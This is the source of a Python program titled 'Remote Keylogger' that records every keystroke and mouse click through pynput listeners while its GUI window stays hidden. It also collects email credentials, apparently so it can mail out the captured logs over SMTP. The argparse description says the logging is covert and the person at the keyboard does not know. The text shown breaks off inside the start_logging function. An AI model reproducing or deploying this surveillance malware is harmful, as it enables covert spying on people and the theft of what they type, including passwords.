#keylogger by fariz

# encoding: utf-8
# author:   #JahidFariz
# version:  v20220415
# language: Python v3.10.4

# Built-in modules...
from argparse import ArgumentParser
from datetime import datetime
from email.message import EmailMessage
from getpass import getuser  # ONE TIME DECLARATION VARIABLE
from logging import basicConfig, info
from os import mkdir, remove
from os import system as terminal
from os.path import getsize, isdir, isfile, join, split
from platform import system as environment  # ONE TIME DECLARATION VARIABLE
from random import choice  # ONE TIME DECLARATION VARIABLE
from smtplib import (
    SMTP,
    SMTPAuthenticationError,
    SMTPRecipientsRefused,
    SMTPServerDisconnected,
)
from socket import gaierror
from sys import exit as terminate
from time import time
from webbrowser import open as browser

operating_system: str = environment()  # STATIC VARIABLE
__version__: str = "v20220415"  # DYNAMIC VARIABLE

if operating_system == "Windows":
    terminal(command=f"title Remote Keylogger {__version__}")


def clear_screen():
    if operating_system == "Linux":
        terminal(command="clear")

    if operating_system == "Windows":
        terminal(command="cls")


clear_screen()

parser = ArgumentParser(
    description="Keystroke logging often referred to as key-logging or keyboard capturing, "
    "is the action of recording (logging) the keys struck on a keyboard, typically covertly, "
    "so that a person using the keyboard is unaware that their actions are being monitored."
)
parser.parse_args()

try:
    from tkinter import (
        BOTTOM,
        DISABLED,
        LEFT,
        NORMAL,
        TOP,
        Button,
        Canvas,
        Checkbutton,
        Entry,
        Frame,
        IntVar,
        Label,
        LabelFrame,
        Menu,
        PhotoImage,
        TclError,
        Tk,
        W,
        X,
    )
    from tkinter.messagebox import (
        askokcancel,
        askyesno,
        showerror,
        showinfo,
        showwarning,
    )

except ModuleNotFoundError as module_not_found_error:
    clear_screen()

    print("-" * 100)
    print("Error Code: ModuleNotFoundError")
    print(
        f"[ERROR]\t[{datetime.now()}]\tFailed to import tkinter module. {module_not_found_error}"
    )

    if operating_system == "Windows":
        terminal(
            command=f"msg * Failed to import tkinter module. {module_not_found_error}"
        )

    if operating_system == "Linux":
        print(
            f"[INFO]\t[{datetime.now()}]\tUse the following command to install tkinter module:\n"
            f"sudo apt update && sudo apt install python3-tk -y"
        )

        terminal(
            command="notify-send 'Failed to import tkinter modlue.\n"
            "Use the following command to install tkinter module:\n"
            "sudo apt update && sudo apt install python3-tk -y'"
        )

    print("-" * 100)
    print("exiting...")

    terminate()

username: str = getuser()  # STATIC VARIABLE
base_path = split(p=__file__)[0]  # STATIC VARIABLE
initial_time: float = time()  # DYNAMIC VARIABLE

# modules for Windows operating system...
if operating_system == "Windows":
    print(f"[INFO]\t[{datetime.now()}]\tImporting windll from ctypes")
    from ctypes import windll

    print(f"[INFO]\t[{datetime.now()}]\tImporting Beep, MessageBeep from winsound")
    from winsound import Beep, MessageBeep


# WE CREATING THE GUI APP SESSION BEFORE IMPORTING THE OTHER MODULES.
app = None  # DYNAMIC VARIABLE
# Creating GUI Application using Built-in function called Tk.
try:
    print(f"[INFO]\t[{datetime.now()}]\tLoading GUI application, please wait...")
    app = Tk()  # DYNAMIC VARIABLE
    app.withdraw()  # hides gui window

except TclError as tcl_error:
    clear_screen()

    print("-" * 100)
    print("Error Code: tkinter.TclError")
    print(f"[ERROR]\t[{datetime.now()}]\tFailed to load GUI application session.")
    print(f"[ERROR]\t[{datetime.now()}]\tSorry, an error occurred! {tcl_error}")
    print("-" * 100)
    print("exiting...")

    if operating_system == "Windows":
        terminal(command=f"msg * Failed to load GUI application! {tcl_error}")

    if operating_system == "Linux":
        terminal(command=f"notify-send 'Failed to load GUI application {tcl_error}'")

    terminate()

if isfile(path=join(base_path, "assets/logo.png")):
    logo = PhotoImage(file=join(base_path, "assets/logo.png"))
    app.iconphoto(False, logo)

else:
    clear_screen()

    print("-" * 100)
    print(f"[WARN]\t[{datetime.now()}]\tassets/logo.ico image file is missing!!")
    print("-" * 100)

# Trying to import third-party module called colorama
try:
    print(
        f"[INFO]\t[{datetime.now()}]\tImporting Back, Fore, Style, init from colorama"
    )
    from colorama import Back, Fore, Style, init

    print(f"[INFO]\t[{datetime.now()}]\tInitiating colorama...")
    init(autoreset=True)

except ModuleNotFoundError as module_not_found_error:
    clear_screen()

    print("-" * 100)
    print("Error Code: ModuleNotFoundError")
    print(
        f"[ERROR]\t[{datetime.now()}]\tSorry, an error occurred! {module_not_found_error}"
    )
    print(
        f"[INFO]\t[{datetime.now()}]\tUse the following command to install colorama: "
        "pip install colorama==0.4.4"
    )
    print("-" * 100)
    print("exiting...")

    # USER CONTROL FLOW
    showerror(
        title=f"Remote Keylogger {__version__}",
        message=f"{module_not_found_error}. Use the following command to install colorama:\n"
        "pip install colorama==0.4.4",
    )

    app.destroy()
    terminate()

print(Fore.RED + Style.BRIGHT + "-" * 100)

# Trying to import third-party module called pyfiglet
try:
    print(
        "[" + Fore.GREEN + Style.BRIGHT + "INFO" + Style.RESET_ALL + "]\t"
        "["
        + Fore.BLUE
        + Style.BRIGHT
        + str(datetime.now())
        + Style.RESET_ALL
        + "]\t"
        + Style.BRIGHT
        + "Importing FontNotFound, figlet_format, fonts from pyfiglet"
    )
    from pyfiglet import FontNotFound, figlet_format, fonts

# Failed to import pyfiglet
except ModuleNotFoundError as module_not_found_error:
    clear_screen()

    print(Fore.RED + Style.BRIGHT + "-" * 100)
    print(Fore.RED + Style.BRIGHT + "Error Code: ModuleNotFoundError")
    print(
        Fore.RED
        + Style.BRIGHT
        + f"[ERROR]\t[{datetime.now()}]\tSorry, an error occurred! {module_not_found_error}"
    )
    print(
        Fore.RED
        + Style.BRIGHT
        + f"[INFO]\t[{datetime.now()}]\tUse the following command to install pyfiglet: "
        "pip install pyfiglet==0.8.post1"
    )
    print(Fore.RED + Style.BRIGHT + "-" * 100)
    print(Fore.RED + Style.BRIGHT + "exiting...")

    # USER CONTROL FLOW
    showerror(
        title=f"Remote Keylogger {__version__}",
        message=f"{module_not_found_error}. Use the following command to install pyfiglet:\n"
        "pip install pyfiglet==0.8.post1",
    )

    app.destroy()
    terminate()

# Trying to import third-party module called pynput
try:
    print(
        "[" + Fore.GREEN + Style.BRIGHT + "INFO" + Style.RESET_ALL + "]\t"
        "["
        + Fore.BLUE
        + Style.BRIGHT
        + str(datetime.now())
        + Style.RESET_ALL
        + "]\t"
        + Style.BRIGHT
        + "Importing Key from pynput.keyboard"
    )
    from pynput.keyboard import Key

    print(
        "[" + Fore.GREEN + Style.BRIGHT + "INFO" + Style.RESET_ALL + "]\t"
        "["
        + Fore.BLUE
        + Style.BRIGHT
        + str(datetime.now())
        + Style.RESET_ALL
        + "]\t"
        + Style.BRIGHT
        + "Importing Listener as KeyboardListener from pynput.keyboard"
    )
    from pynput.keyboard import Listener as KeyboardListener

    print(
        "[" + Fore.GREEN + Style.BRIGHT + "INFO" + Style.RESET_ALL + "]\t"
        "["
        + Fore.BLUE
        + Style.BRIGHT
        + str(datetime.now())
        + Style.RESET_ALL
        + "]\t"
        + Style.BRIGHT
        + "Importing Button as MouseButton from pynput.mouse"
    )
    from pynput.mouse import Button as MouseButton

    print(
        "[" + Fore.GREEN + Style.BRIGHT + "INFO" + Style.RESET_ALL + "]\t"
        "["
        + Fore.BLUE
        + Style.BRIGHT
        + str(datetime.now())
        + Style.RESET_ALL
        + "]\t"
        + Style.BRIGHT
        + "Importing Listener as MouseListener from pynput.mouse"
    )
    from pynput.mouse import Listener as MouseListener

# Failed to import pynput module
except ModuleNotFoundError as module_not_found_error:
    clear_screen()

    print(Fore.RED + Style.BRIGHT + "-" * 100)
    print(Fore.RED + Style.BRIGHT + "Error Code: ModuleNotFoundError")
    print(
        Fore.RED
        + Style.BRIGHT
        + f"[ERROR]\t[{datetime.now()}]\tSorry, an error occurred! {module_not_found_error}"
    )
    print(
        Fore.RED
        + Style.BRIGHT
        + f'[INFO]\t[{datetime.now()}]\tUse the following command to install pynput: "pip install pynput==1.7.6"'
    )
    print(Fore.RED + Style.BRIGHT + "-" * 100)
    print(Fore.RED + Style.BRIGHT + "exiting...")

    # USER CONTROL FLOW
    showerror(
        title=f"Remote Keylogger {__version__}",
        message=f"{module_not_found_error}. Use the following command to install pynput:\n"
        "pip install pynput==1.7.6",
    )

    app.destroy()
    terminate()

# Failed to import pynput module with sudo permission
except ImportError as import_error:
    Key = KeyboardListener = MouseButton = MouseListener = None

    clear_screen()

    print(Fore.RED + Style.BRIGHT + "-" * 100)
    print(Fore.RED + Style.BRIGHT + "Error Code: ImportError")
    print(
        Fore.RED
        + Style.BRIGHT
        + f"[ERROR]\t[{datetime.now()}]\tSorry, an error occurred! {import_error}"
    )
    print(Fore.RED + Style.BRIGHT + "-" * 100)

    # USER CONTROL FLOW
    showerror(
        title=f"Remote Keylogger {__version__}",
        message=f"Failed to import pynput.\n{import_error}",
    )

    app.destroy()
    terminate()

# Importing third-party module called requests
try:
    print(
        "[" + Fore.GREEN + Style.BRIGHT + "INFO" + Style.RESET_ALL + "]\t"
        "["
        + Fore.BLUE
        + Style.BRIGHT
        + str(datetime.now())
        + Style.RESET_ALL
        + "]\t"
        + Style.BRIGHT
        + "Importing get from requests"
    )
    from requests import get

    print(
        "[" + Fore.GREEN + Style.BRIGHT + "INFO" + Style.RESET_ALL + "]\t"
        "["
        + Fore.BLUE
        + Style.BRIGHT
        + str(datetime.now())
        + Style.RESET_ALL
        + "]\t"
        + Style.BRIGHT
        + "Importing ConnectionError from requests.exceptions"
    )
    from requests.exceptions import ConnectionError

# Failed to import requests
except ModuleNotFoundError as module_not_found_error:
    clear_screen()

    print(Fore.RED + Style.BRIGHT + "-" * 100)
    print(Fore.RED + Style.BRIGHT + "Error Code: ModuleNotFoundError")
    print(
        Fore.RED + Style.BRIGHT + f"[ERROR]\t[{datetime.now()}]\t"
        f"Sorry, an error occurred! {module_not_found_error}"
    )
    print(
        Fore.RED
        + Style.BRIGHT
        + f'[INFO]\t[{datetime.now()}]\tUse the following command to install pynput: "pip install requests==2.27.1"'
    )
    print(Fore.RED + Style.BRIGHT + "-" * 100)
    print(Fore.RED + Style.BRIGHT + "exiting...")

    # USER CONTROL FLOW
    showerror(
        title=f"Remote Keylogger {__version__}",
        message=f"{module_not_found_error}. Use the following command to install requests:\n"
        "pip install requests==2.27.1",
    )

    app.destroy()
    terminate()


def file_operation(file: str, mode: str):
    file = open(file, mode)
    data = file.read()
    file.close()

    return data


def on_press(key):
    # TOTAL KNOWN SIGNATURES: 047
    # TOTAL UNKNOWN SIGNATURES: 001
    if key == Key.alt_gr:
        print(
            "[" + Fore.YELLOW + Style.BRIGHT + "LOG" + Style.RESET_ALL + "]\t"
            "["
            + Fore.BLUE
            + Style.BRIGHT
            + str(datetime.now())
            + Style.RESET_ALL
            + "]\t"
            + Style.BRIGHT
            + "alt_gr pressed."
        )
        info(msg="alt_gr pressed.")

    elif key == Key.alt_l:
        print(
            "[" + Fore.YELLOW + Style.BRIGHT + "LOG" + Style.RESET_ALL + "]\t"
            "["
            + Fore.BLUE
            + Style.BRIGHT
            + str(datetime.now())
            + Style.RESET_ALL
            + "]\t"
            + Style.BRIGHT
            + "alt_l pressed."
        )
        info(msg="alt_l pressed.")

    elif key == Key.backspace:
        print(
            "[" + Fore.YELLOW + Style.BRIGHT + "LOG" + Style.RESET_ALL + "]\t"
            "["
            + Fore.BLUE
            + Style.BRIGHT
            + str(datetime.now())
            + Style.RESET_ALL
            + "]\t"
            + Style.BRIGHT
            + "backspace pressed."
        )
        info(msg="backspace pressed.")

    elif key == Key.caps_lock:
        print(
            "[" + Fore.YELLOW + Style.BRIGHT + "LOG" + Style.RESET_ALL + "]\t"
            "["
            + Fore.BLUE
            + Style.BRIGHT
            + str(datetime.now())
            + Style.RESET_ALL
            + "]\t"
            + Style.BRIGHT
            + "caps_lock pressed."
        )
        info(msg="caps_lock pressed.")

    elif key == Key.cmd:
        print(
            "[" + Fore.YELLOW + Style.BRIGHT + "LOG" + Style.RESET_ALL + "]\t"
            "["
            + Fore.BLUE
            + Style.BRIGHT
            + str(datetime.now())
            + Style.RESET_ALL
            + "]\t"
            + Style.BRIGHT
            + "cmd pressed."
        )
        info(msg="cmd pressed.")

    elif key == Key.cmd_r:
        print(
            "[" + Fore.YELLOW + Style.BRIGHT + "LOG" + Style.RESET_ALL + "]\t"
            "["
            + Fore.BLUE
            + Style.BRIGHT
            + str(datetime.now())
            + Style.RESET_ALL
            + "]\t"
            + Style.BRIGHT
            + "cmd_r pressed."
        )
        info(msg="cmd_r pressed.")

    elif key == Key.ctrl_l:
        print(
            "[" + Fore.YELLOW + Style.BRIGHT + "LOG" + Style.RESET_ALL + "]\t"
            "["
            + Fore.BLUE
            + Style.BRIGHT
            + str(datetime.now())
            + Style.RESET_ALL
            + "]\t"
            + Style.BRIGHT
            + "ctrl_l pressed."
        )
        info(msg="ctrl_l pressed.")

    elif key == Key.ctrl_r:
        print(
            "[" + Fore.YELLOW + Style.BRIGHT + "LOG" + Style.RESET_ALL + "]\t"
            "["
            + Fore.BLUE
            + Style.BRIGHT
            + str(datetime.now())
            + Style.RESET_ALL
            + "]\t"
            + Style.BRIGHT
            + "ctrl_r pressed."
        )
        info(msg="ctrl_r pressed.")

    elif key == Key.delete:
        print(
            "[" + Fore.YELLOW + Style.BRIGHT + "LOG" + Style.RESET_ALL + "]\t"
            "["
            + Fore.BLUE
            + Style.BRIGHT
            + str(datetime.now())
            + Style.RESET_ALL
            + "]\t"
            + Style.BRIGHT
            + "delete pressed."
        )
        info(msg="delete pressed.")

    elif key == Key.down:
        print(
            "[" + Fore.YELLOW + Style.BRIGHT + "LOG" + Style.RESET_ALL + "]\t"
            "["
            + Fore.BLUE
            + Style.BRIGHT
            + str(datetime.now())
            + Style.RESET_ALL
            + "]\t"
            + Style.BRIGHT
            + "down pressed."
        )
        info(msg="down pressed.")

    elif key == Key.end:
        print(
            "[" + Fore.YELLOW + Style.BRIGHT + "LOG" + Style.RESET_ALL + "]\t"
            "["
            + Fore.BLUE
            + Style.BRIGHT
            + str(datetime.now())
            + Style.RESET_ALL
            + "]\t"
            + Style.BRIGHT
            + "end pressed."
        )
        info(msg="end pressed.")

    elif key == Key.enter:
        print(
            "[" + Fore.YELLOW + Style.BRIGHT + "LOG" + Style.RESET_ALL + "]\t"
            "["
            + Fore.BLUE
            + Style.BRIGHT
            + str(datetime.now())
            + Style.RESET_ALL
            + "]\t"
            + Style.BRIGHT
            + "enter pressed."
        )
        info(msg="enter pressed.")

    elif key == Key.esc:
        print(
            "[" + Fore.YELLOW + Style.BRIGHT + "LOG" + Style.RESET_ALL + "]\t"
            "["
            + Fore.BLUE
            + Style.BRIGHT
            + str(datetime.now())
            + Style.RESET_ALL
            + "]\t"
            + Style.BRIGHT
            + "esc pressed."
        )
        info(msg="esc pressed.")

    elif key == Key.f1:
        print(
            "[" + Fore.YELLOW + Style.BRIGHT + "LOG" + Style.RESET_ALL + "]\t"
            "["
            + Fore.BLUE
            + Style.BRIGHT
            + str(datetime.now())
            + Style.RESET_ALL
            + "]\t"
            + Style.BRIGHT
            + "f1 pressed."
        )
        info(msg="f1 pressed.")

    elif key == Key.f2:
        print(
            "[" + Fore.YELLOW + Style.BRIGHT + "LOG" + Style.RESET_ALL + "]\t"
            "["
            + Fore.BLUE
            + Style.BRIGHT
            + str(datetime.now())
            + Style.RESET_ALL
            + "]\t"
            + Style.BRIGHT
            + "f2 pressed."
        )
        info(msg="f2 pressed.")

    elif key == Key.f3:
        print(
            "[" + Fore.YELLOW + Style.BRIGHT + "LOG" + Style.RESET_ALL + "]\t"
            "["
            + Fore.BLUE
            + Style.BRIGHT
            + str(datetime.now())
            + Style.RESET_ALL
            + "]\t"
            + Style.BRIGHT
            + "f3 pressed."
        )
        info(msg="f3 pressed.")

    elif key == Key.f4:
        print(
            "[" + Fore.YELLOW + Style.BRIGHT + "LOG" + Style.RESET_ALL + "]\t"
            "["
            + Fore.BLUE
            + Style.BRIGHT
            + str(datetime.now())
            + Style.RESET_ALL
            + "]\t"
            + Style.BRIGHT
            + "f4 pressed."
        )
        info(msg="f4 pressed.")

    elif key == Key.f5:
        print(
            "[" + Fore.YELLOW + Style.BRIGHT + "LOG" + Style.RESET_ALL + "]\t"
            "["
            + Fore.BLUE
            + Style.BRIGHT
            + str(datetime.now())
            + Style.RESET_ALL
            + "]\t"
            + Style.BRIGHT
            + "f5 pressed."
        )
        info(msg="f5 pressed.")

    elif key == Key.f6:
        print(
            "[" + Fore.YELLOW + Style.BRIGHT + "LOG" + Style.RESET_ALL + "]\t"
            "["
            + Fore.BLUE
            + Style.BRIGHT
            + str(datetime.now())
            + Style.RESET_ALL
            + "]\t"
            + Style.BRIGHT
            + "f6 pressed."
        )
        info(msg="f6 pressed.")

    elif key == Key.f7:
        print(
            "[" + Fore.YELLOW + Style.BRIGHT + "LOG" + Style.RESET_ALL + "]\t"
            "["
            + Fore.BLUE
            + Style.BRIGHT
            + str(datetime.now())
            + Style.RESET_ALL
            + "]\t"
            + Style.BRIGHT
            + "f7 pressed."
        )
        info(msg="f7 pressed.")

    elif key == Key.f8:
        print(
            "[" + Fore.YELLOW + Style.BRIGHT + "LOG" + Style.RESET_ALL + "]\t"
            "["
            + Fore.BLUE
            + Style.BRIGHT
            + str(datetime.now())
            + Style.RESET_ALL
            + "]\t"
            + Style.BRIGHT
            + "f8 pressed."
        )
        info(msg="f8 pressed.")

    elif key == Key.f9:
        print(
            "[" + Fore.YELLOW + Style.BRIGHT + "LOG" + Style.RESET_ALL + "]\t"
            "["
            + Fore.BLUE
            + Style.BRIGHT
            + str(datetime.now())
            + Style.RESET_ALL
            + "]\t"
            + Style.BRIGHT
            + "f9 pressed."
        )
        info(msg="f9 pressed.")

    elif key == Key.f10:
        print(
            "[" + Fore.YELLOW + Style.BRIGHT + "LOG" + Style.RESET_ALL + "]\t"
            "["
            + Fore.BLUE
            + Style.BRIGHT
            + str(datetime.now())
            + Style.RESET_ALL
            + "]\t"
            + Style.BRIGHT
            + "f10 pressed."
        )
        info(msg="f10 pressed.")

    elif key == Key.f11:
        print(
            "[" + Fore.YELLOW + Style.BRIGHT + "LOG" + Style.RESET_ALL + "]\t"
            "["
            + Fore.BLUE
            + Style.BRIGHT
            + str(datetime.now())
            + Style.RESET_ALL
            + "]\t"
            + Style.BRIGHT
            + "f11 pressed."
        )
        info(msg="f11 pressed.")

    elif key == Key.f12:
        print(
            "[" + Fore.YELLOW + Style.BRIGHT + "LOG" + Style.RESET_ALL + "]\t"
            "["
            + Fore.BLUE
            + Style.BRIGHT
            + str(datetime.now())
            + Style.RESET_ALL
            + "]\t"
            + Style.BRIGHT
            + "f12 pressed."
        )
        info(msg="f12 pressed.")

    elif key == Key.home:
        print(
            "[" + Fore.YELLOW + Style.BRIGHT + "LOG" + Style.RESET_ALL + "]\t"
            "["
            + Fore.BLUE
            + Style.BRIGHT
            + str(datetime.now())
            + Style.RESET_ALL
            + "]\t"
            + Style.BRIGHT
            + "home pressed."
        )
        info(msg="home pressed.")

    elif key == Key.insert:
        print(
            "[" + Fore.YELLOW + Style.BRIGHT + "LOG" + Style.RESET_ALL + "]\t"
            "["
            + Fore.BLUE
            + Style.BRIGHT
            + str(datetime.now())
            + Style.RESET_ALL
            + "]\t"
            + Style.BRIGHT
            + "insert pressed."
        )
        info(msg="insert pressed.")

    elif key == Key.left:
        print(
            "[" + Fore.YELLOW + Style.BRIGHT + "LOG" + Style.RESET_ALL + "]\t"
            "["
            + Fore.BLUE
            + Style.BRIGHT
            + str(datetime.now())
            + Style.RESET_ALL
            + "]\t"
            + Style.BRIGHT
            + "left pressed."
        )
        info(msg="left pressed.")

    elif key == Key.media_next:
        print(
            "[" + Fore.YELLOW + Style.BRIGHT + "LOG" + Style.RESET_ALL + "]\t"
            "["
            + Fore.BLUE
            + Style.BRIGHT
            + str(datetime.now())
            + Style.RESET_ALL
            + "]\t"
            + Style.BRIGHT
            + "media_next pressed."
        )
        info(msg="media_next pressed.")

    elif key == Key.media_play_pause:
        print(
            "[" + Fore.YELLOW + Style.BRIGHT + "LOG" + Style.RESET_ALL + "]\t"
            "["
            + Fore.BLUE
            + Style.BRIGHT
            + str(datetime.now())
            + Style.RESET_ALL
            + "]\t"
            + Style.BRIGHT
            + "media_play_pause pressed."
        )
        info(msg="media_play_pause pressed.")

    elif key == Key.media_previous:
        print(
            "[" + Fore.YELLOW + Style.BRIGHT + "LOG" + Style.RESET_ALL + "]\t"
            "["
            + Fore.BLUE
            + Style.BRIGHT
            + str(datetime.now())
            + Style.RESET_ALL
            + "]\t"
            + Style.BRIGHT
            + "media_previous pressed."
        )
        info(msg="media_previous pressed.")

    elif key == Key.media_volume_down:
        print(
            "[" + Fore.YELLOW + Style.BRIGHT + "LOG" + Style.RESET_ALL + "]\t"
            "["
            + Fore.BLUE
            + Style.BRIGHT
            + str(datetime.now())
            + Style.RESET_ALL
            + "]\t"
            + Style.BRIGHT
            + "media_volume_down pressed."
        )
        info(msg="media_volume_down pressed.")

    elif key == Key.media_volume_mute:
        print(
            "[" + Fore.YELLOW + Style.BRIGHT + "LOG" + Style.RESET_ALL + "]\t"
            "["
            + Fore.BLUE
            + Style.BRIGHT
            + str(datetime.now())
            + Style.RESET_ALL
            + "]\t"
            + Style.BRIGHT
            + "media_volume_mute pressed."
        )
        info(msg="media_volume_mute pressed.")

    elif key == Key.media_volume_up:
        print(
            "[" + Fore.YELLOW + Style.BRIGHT + "LOG" + Style.RESET_ALL + "]\t"
            "["
            + Fore.BLUE
            + Style.BRIGHT
            + str(datetime.now())
            + Style.RESET_ALL
            + "]\t"
            + Style.BRIGHT
            + "media_volume_up pressed."
        )
        info(msg="media_volume_up pressed.")

    elif key == Key.menu:
        print(
            "[" + Fore.YELLOW + Style.BRIGHT + "LOG" + Style.RESET_ALL + "]\t"
            "["
            + Fore.BLUE
            + Style.BRIGHT
            + str(datetime.now())
            + Style.RESET_ALL
            + "]\t"
            + Style.BRIGHT
            + "menu pressed."
        )
        info(msg="menu pressed.")

    elif key == Key.num_lock:
        print(
            "[" + Fore.YELLOW + Style.BRIGHT + "LOG" + Style.RESET_ALL + "]\t"
            "["
            + Fore.BLUE
            + Style.BRIGHT
            + str(datetime.now())
            + Style.RESET_ALL
            + "]\t"
            + Style.BRIGHT
            + "num_lock pressed."
        )
        info(msg="num_lock pressed.")

    elif key == Key.page_down:
        print(
            "[" + Fore.YELLOW + Style.BRIGHT + "LOG" + Style.RESET_ALL + "]\t"
            "["
            + Fore.BLUE
            + Style.BRIGHT
            + str(datetime.now())
            + Style.RESET_ALL
            + "]\t"
            + Style.BRIGHT
            + "page_down pressed."
        )
        info(msg="page_down pressed.")

    elif key == Key.page_up:
        print(
            "[" + Fore.YELLOW + Style.BRIGHT + "LOG" + Style.RESET_ALL + "]\t"
            "["
            + Fore.BLUE
            + Style.BRIGHT
            + str(datetime.now())
            + Style.RESET_ALL
            + "]\t"
            + Style.BRIGHT
            + "page_up pressed."
        )
        info(msg="page_up pressed.")

    elif key == Key.pause:
        print(
            "[" + Fore.YELLOW + Style.BRIGHT + "LOG" + Style.RESET_ALL + "]\t"
            "["
            + Fore.BLUE
            + Style.BRIGHT
            + str(datetime.now())
            + Style.RESET_ALL
            + "]\t"
            + Style.BRIGHT
            + "pause pressed"
        )
        info(msg="pause pressed")

    elif key == Key.print_screen:
        print(
            "[" + Fore.YELLOW + Style.BRIGHT + "LOG" + Style.RESET_ALL + "]\t"
            "["
            + Fore.BLUE
            + Style.BRIGHT
            + str(datetime.now())
            + Style.RESET_ALL
            + "]\t"
            + Style.BRIGHT
            + "print_screen pressed."
        )
        info(msg="print_screen pressed.")

    elif key == Key.right:
        print(
            "[" + Fore.YELLOW + Style.BRIGHT + "LOG" + Style.RESET_ALL + "]\t"
            "["
            + Fore.BLUE
            + Style.BRIGHT
            + str(datetime.now())
            + Style.RESET_ALL
            + "]\t"
            + Style.BRIGHT
            + "right pressed."
        )
        info(msg="right pressed.")

    elif key == Key.scroll_lock:
        print(
            "[" + Fore.YELLOW + Style.BRIGHT + "LOG" + Style.RESET_ALL + "]\t"
            "["
            + Fore.BLUE
            + Style.BRIGHT
            + str(datetime.now())
            + Style.RESET_ALL
            + "]\t"
            + Style.BRIGHT
            + "scroll_lock pressed."
        )
        info(msg="scroll_lock pressed.")

    elif key == Key.shift:
        print(
            "[" + Fore.YELLOW + Style.BRIGHT + "LOG" + Style.RESET_ALL + "]\t"
            "["
            + Fore.BLUE
            + Style.BRIGHT
            + str(datetime.now())
            + Style.RESET_ALL
            + "]\t"
            + Style.BRIGHT
            + "shift pressed."
        )
        info(msg="shift pressed.")

    elif key == Key.shift_r:
        print(
            "[" + Fore.YELLOW + Style.BRIGHT + "LOG" + Style.RESET_ALL + "]\t"
            "["
            + Fore.BLUE
            + Style.BRIGHT
            + str(datetime.now())
            + Style.RESET_ALL
            + "]\t"
            + Style.BRIGHT
            + "shift_r pressed."
        )
        info(msg="shift_r pressed.")

    elif key == Key.space:
        print(
            "[" + Fore.YELLOW + Style.BRIGHT + "LOG" + Style.RESET_ALL + "]\t"
            "["
            + Fore.BLUE
            + Style.BRIGHT
            + str(datetime.now())
            + Style.RESET_ALL
            + "]\t"
            + Style.BRIGHT
            + "space pressed."
        )
        info(msg="space pressed.")

    elif key == Key.tab:
        print(
            "[" + Fore.YELLOW + Style.BRIGHT + "LOG" + Style.RESET_ALL + "]\t"
            "["
            + Fore.BLUE
            + Style.BRIGHT
            + str(datetime.now())
            + Style.RESET_ALL
            + "]\t"
            + Style.BRIGHT
            + "tab pressed."
        )
        info(msg="tab pressed.")

    elif key == Key.up:
        print(
            "[" + Fore.YELLOW + Style.BRIGHT + "LOG" + Style.RESET_ALL + "]\t"
            "["
            + Fore.BLUE
            + Style.BRIGHT
            + str(datetime.now())
            + Style.RESET_ALL
            + "]\t"
            + Style.BRIGHT
            + "up pressed."
        )
        info(msg="up pressed.")

    else:
        print(
            "[" + Fore.YELLOW + Style.BRIGHT + "LOG" + Style.RESET_ALL + "]\t"
            "["
            + Fore.BLUE
            + Style.BRIGHT
            + str(datetime.now())
            + Style.RESET_ALL
            + "]\t"
            + Style.BRIGHT
            + f"{key} pressed."
        )
        info(msg=f"{key} pressed.")


def on_click(x, y, button, pressed):
    # TOTAL KNOWN SIGNATURES: 002
    if button == MouseButton.left:
        button: {__eq__} = "left button"  # DYNAMIC VARIABLE

    elif button == MouseButton.middle:
        button: {__eq__} = "middle button"  # DYNAMIC VARIABLE

    elif button == MouseButton.right:
        button: {__eq__} = "right button"  # DYNAMIC VARIABLE

    if pressed:
        print(
            "[" + Fore.YELLOW + Style.BRIGHT + "LOG" + Style.RESET_ALL + "]\t"
            "["
            + Fore.BLUE
            + Style.BRIGHT
            + str(datetime.now())
            + Style.RESET_ALL
            + "]\t"
            + Style.BRIGHT
            + f"Mouse clicked at ({x}, {y}) with {button}"
        )
        info(msg=f"Mouse clicked at ({x}, {y}) with {button}")

    else:
        print(
            "[" + Fore.YELLOW + Style.BRIGHT + "LOG" + Style.RESET_ALL + "]\t"
            "["
            + Fore.BLUE
            + Style.BRIGHT
            + str(datetime.now())
            + Style.RESET_ALL
            + "]\t"
            + Style.BRIGHT
            + "Mouse released at ({x}, {y}) with {button}"
        )
        info(msg=f"Mouse released at ({x}, {y}) with {button}")


def start_logging():
    app.withdraw()  # hides gui window

    email_address: str = email_entry.get().strip()  # DYNAMIC VARIABLE
    password: str = password_entry.get().strip()  # DYNAMIC VARIABLE
    to_address: str = to_address_entry.get().strip()  # DYNAMIC VARIABLE

    if email_label_frame["fg"] == "red":
        email_label_frame.config(fg="black")
        app.update()

    if password_label_frame["fg"] == "red":
        password_label_frame.config(fg="black")
        app.update()

    if to_address_label_frame["fg"] == "red":
        to_address_label_frame.config(fg="black")
        app.update()

    # If username field is null,
    if len(email_address):
        if len(email_address.split("@")) == 2:
            un = email_address.split("@")[0]
            sp = email_address.split("@")[1]

            if len(un) < 6 or len(un) > 30:
                print(Fore.YELLOW + Style.BRIGHT + "-" * 100)
                print(
                    "["
                    + Fore.YELLOW
                    + Style.BRIGHT
                    + "WARN"
                    + Style.RESET_ALL
                    + "]\t["
                    + Fore.BLUE
                    + Style.BRIGHT
                    + str(datetime.now())
                    + Style.RESET_ALL
                    + "]\t"
                    + Style.BRIGHT
                    + "Invalid email address, your username must be between 6 and 30 characters long."
                )
                print(Fore.YELLOW + Style.BRIGHT + "-" * 100)

                email_label_frame.config(fg="red")

                # USER CONTROL FLOW
                showinfo(
                    title=f"Remote Keylogger {__version__}",
                    message="Invalid email address, your username must be between 6 and 30 characters long.",
                )

                app.deiconify()  # un-hides gui window
                return None

            # https://www.digitalspy.com/tv/a809925/ofcom-swear-words-ranking-in-order-of-offensiveness/

            if (
                un == "arsehole"
                or un == "bastard"
                or un == "beaver"
                or un == "bollock"
                or un == "dickhead"
                or un == "goddam"
                or un == "hooker"
                or un == "hotmail"
                or un == "microsoft"
                or un == "outlook"
                or un == "pervert"
                or un == "pissed"
                or un == "punani"
                or un == "username"
                or un == "vagina"
                or un.__contains__("account")
                or un.__contains__("admin")
                or un.__contains__("asshole")
                or un.__contains__("bitch")
                or un.__contains__("bullshit")
                or un.__contains__("cunt")
                or un.__contains__("fuck")
                or un.__contains__("gmail")
                or un.__contains__("google")
                or un.__contains__("pussy")
            ):
                print(Fore.YELLOW + Style.BRIGHT + "-" * 100)
                print(
                    "["
                    + Fore.YELLOW
                    + Style.BRIGHT
                    + "WARN"
                    + Style.RESET_ALL
                    + "]\t["
                    + Fore.BLUE
                    + Style.BRIGHT
                    + str(datetime.now())
                    + Style.RESET_ALL
                    + "]\t"
                    + Style.BRIGHT
                    + "Sorry, This username isn't allowed. Try again."
                )
                print(Fore.YELLOW + Style.BRIGHT + "-" * 100)

                # USER CONTROL FLOW
                showinfo(
                    title=f"Remote Keylogger {__version__}",
                    message="Sorry, This username isn't allowed. Try again.",
